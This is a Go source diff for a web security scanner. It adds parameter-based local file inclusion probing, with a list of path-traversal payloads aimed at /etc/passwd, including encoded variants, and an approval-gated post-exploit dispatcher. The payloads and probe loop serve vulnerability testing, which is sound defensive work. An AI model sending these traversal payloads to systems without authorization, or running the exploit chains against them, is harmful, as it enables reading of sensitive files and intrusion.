@@ -20,10 +20,12 @@ import (
 	"strings"
 	"time"
 
-	"github.com/stormbane-security/beacon/internal/scan"
 	"github.com/stormbane-security/beacon/internal/finding"
 	"github.com/stormbane-security/beacon/internal/module"
+	"github.com/stormbane-security/beacon/internal/postexploit"
+	"github.com/stormbane-security/beacon/internal/scan"
 	"github.com/stormbane-security/beacon/internal/scanner/authctx"
+	"github.com/stormbane-security/beacon/internal/scanner/paramdiscovery"
 	"github.com/stormbane-security/beacon/internal/scanner/schemedetect"
 )
 
@@ -67,6 +69,34 @@ var protectedPaths = []string{
 	"/actuator",
 }
 
+// lfiPaths are endpoints that commonly accept file parameters.
+var lfiPaths = []struct {
+	path   string
+	params []string
+}{
+	{"/", []string{"file", "path", "page", "template", "include", "doc", "load"}},
+	{"/view", []string{"file", "path", "page", "name"}},
+	{"/read", []string{"file", "path", "name"}},
+	{"/download", []string{"file", "path", "name"}},
+	{"/include", []string{"file", "path", "page"}},
+	{"/template", []string{"file", "name", "path"}},
+	{"/api/file", []string{"path", "name"}},
+	{"/api/read", []string{"file", "path"}},
+	{"/api/download", []string{"file", "path"}},
+	{"/static", []string{"file", "path"}},
+	{"/assets", []string{"file", "path"}},
+	{"/render", []string{"file", "template", "path"}},
+}
+
+// lfiPayloads are path traversal payloads for parameter-based LFI.
+var lfiPayloads = []string{
+	"../../../../../../etc/passwd",
+	"....//....//....//....//etc/passwd",
+	"..%2f..%2f..%2f..%2fetc%2fpasswd",
+	"..%252f..%252f..%252fetc%252fpasswd",
+	"/etc/passwd",
+}
+
 // sensitiveTargets — if traversal reaches these, it confirms the bypass.
 // All lowercase because they are compared against strings.ToLower(body).
 var sensitiveTargets = []string{
@@ -100,7 +130,15 @@ func (s *Scanner) Run(ctx context.Context, asset string, scanType module.ScanTyp
 	base := schemedetect.Base(ctx, client, asset)
 	var findings []finding.Finding
 
-	for _, path := range protectedPaths {
+	// Merge discovered paths from crawl results into the protected paths list
+	// and LFI paths for traversal testing.
+	effectiveProtectedPaths := protectedPaths
+	effectiveLFIPaths := lfiPaths
+	if discovered := paramdiscovery.DiscoveredParamsFromContext(ctx); len(discovered) > 0 {
+		effectiveProtectedPaths, effectiveLFIPaths = mergeDiscoveredPathTraversal(protectedPaths, lfiPaths, discovered)
+	}
+
+	for _, path := range effectiveProtectedPaths {
 		if ctx.Err() != nil {
 			break
 		}
@@ -199,5 +237,150 @@ func (s *Scanner) Run(ctx context.Context, asset string, scanType module.ScanTyp
 		}
 	}
 
+	// Web exploit dispatcher: run post-exploit chains with per-module approval.
+	if scanType == module.ScanAuthorized && len(findings) > 0 {
+		dispatcher := postexploit.NewWebExploitDispatcher()
+		approveFunc := postexploit.ApproveFuncFromContext(ctx)
+		fb := &postexploit.FindingBuilder{
+			Module:  "deep",
+			Scanner: scannerName,
+			Asset:   asset,
+		}
+		for _, f := range findings {
+			if ctx.Err() != nil {
+				break
+			}
+			if dispatcher.CanExploit(f.CheckID) {
+				if approveFunc == nil || !approveFunc("web-exploit-"+string(f.CheckID), asset, 0) {
+					continue
+				}
+				exploitFindings := dispatcher.Dispatch(ctx, f, fb)
+				findings = append(findings, exploitFindings...)
+			}
+		}
+	}
+
+	// Parameter-based Local File Inclusion (LFI) probing.
+	// Tests endpoints that accept file/path parameters for traversal.
+	for _, lfi := range effectiveLFIPaths {
+		if ctx.Err() != nil {
+			break
+		}
+		lfiURL := base + lfi.path
+		// Check if the endpoint exists at all. A 404 on the path itself
+		// (without params) means the endpoint doesn't exist. But a 404 with
+		// a param like ?file=test is normal for file inclusion endpoints
+		// (file not found ≠ endpoint not found). So only skip if the base
+		// path without params returns 404.
+		checkReq, err := http.NewRequestWithContext(ctx, http.MethodGet, lfiURL, nil)
+		if err != nil {
+			continue
+		}
+		checkResp, err := client.Do(checkReq)
+		if err != nil {
+			continue
+		}
+		_, _ = io.Copy(io.Discard, checkResp.Body)
+		_ = checkResp.Body.Close()
+		// Only skip if the endpoint itself doesn't exist (not the file param)
+		if checkResp.StatusCode == 404 || checkResp.StatusCode == 405 {
+			continue
+		}
+
+		for _, param := range lfi.params {
+			for _, payload := range lfiPayloads {
+				if ctx.Err() != nil {
+					break
+				}
+				tryURL := fmt.Sprintf("%s%s?%s=%s", base, lfi.path, param, payload)
+				req, err := http.NewRequestWithContext(ctx, http.MethodGet, tryURL, nil)
+				if err != nil {
+					continue
+				}
+				resp, err := client.Do(req)
+				if err != nil {
+					continue
+				}
+				body, _ := io.ReadAll(io.LimitReader(resp.Body, 8192))
+				_ = resp.Body.Close()
+				bodyStr := strings.ToLower(string(body))
+
+				if resp.StatusCode == 200 && strings.Contains(bodyStr, "root:") {
+					findings = append(findings, finding.Finding{
+						CheckID:     finding.CheckWebPathTraversal,
+						Module:      "deep",
+						Scanner:     scannerName,
+						Severity:    finding.SeverityHigh,
+						Asset:       asset,
+						Title:       fmt.Sprintf("Local File Inclusion via %s parameter on %s%s", param, asset, lfi.path),
+						Description: fmt.Sprintf("The %s parameter on %s is vulnerable to path traversal. The payload '%s' successfully read /etc/passwd.", param, tryURL, payload),
+						DeepOnly:    true,
+						ProofCommand: fmt.Sprintf(`curl -s "%s"`, tryURL),
+						Evidence: map[string]any{
+							"url":       tryURL,
+							"path":      lfi.path,
+							"parameter": param,
+							"payload":   payload,
+							"method":    "parameter-lfi",
+						},
+						Confidence:   finding.ConfidenceVerified,
+						DiscoveredAt: time.Now(),
+					})
+					goto nextLFIPath // one finding per path is enough
+				}
+			}
+		}
+	nextLFIPath:
+	}
+
 	return findings, nil
+}
+
+// mergeDiscoveredPathTraversal combines hardcoded protected paths and LFI paths
+// with paths discovered from crawl results.
+func mergeDiscoveredPathTraversal(
+	hardcodedProtected []string,
+	hardcodedLFI []struct{ path string; params []string },
+	discovered map[string][]string,
+) ([]string, []struct{ path string; params []string }) {
+	// Expand protected paths with discovered paths.
+	protectedSet := make(map[string]bool, len(hardcodedProtected))
+	for _, p := range hardcodedProtected {
+		protectedSet[p] = true
+	}
+	protPaths := make([]string, len(hardcodedProtected))
+	copy(protPaths, hardcodedProtected)
+
+	// Expand LFI paths with discovered path+param combos.
+	lfi := make([]struct{ path string; params []string }, len(hardcodedLFI))
+	lfiIdx := make(map[string]int, len(hardcodedLFI))
+	for i, pp := range hardcodedLFI {
+		params := make([]string, len(pp.params))
+		copy(params, pp.params)
+		lfi[i] = struct{ path string; params []string }{path: pp.path, params: params}
+		lfiIdx[pp.path] = i
+	}
+
+	for path, newParams := range discovered {
+		// Add to protected paths if it looks like an admin/internal path.
+		if !protectedSet[path] {
+			protPaths = append(protPaths, path)
+			protectedSet[path] = true
+		}
+		// Add to LFI paths with discovered params.
+		if idx, ok := lfiIdx[path]; ok {
+			existing := make(map[string]bool, len(lfi[idx].params))
+			for _, p := range lfi[idx].params {
+				existing[p] = true
+			}
+			for _, p := range newParams {
+				if !existing[p] {
+					lfi[idx].params = append(lfi[idx].params, p)
+				}
+			}
+		} else {
+			lfi = append(lfi, struct{ path string; params []string }{path: path, params: newParams})
+		}
+	}
+	return protPaths, lfi
 }
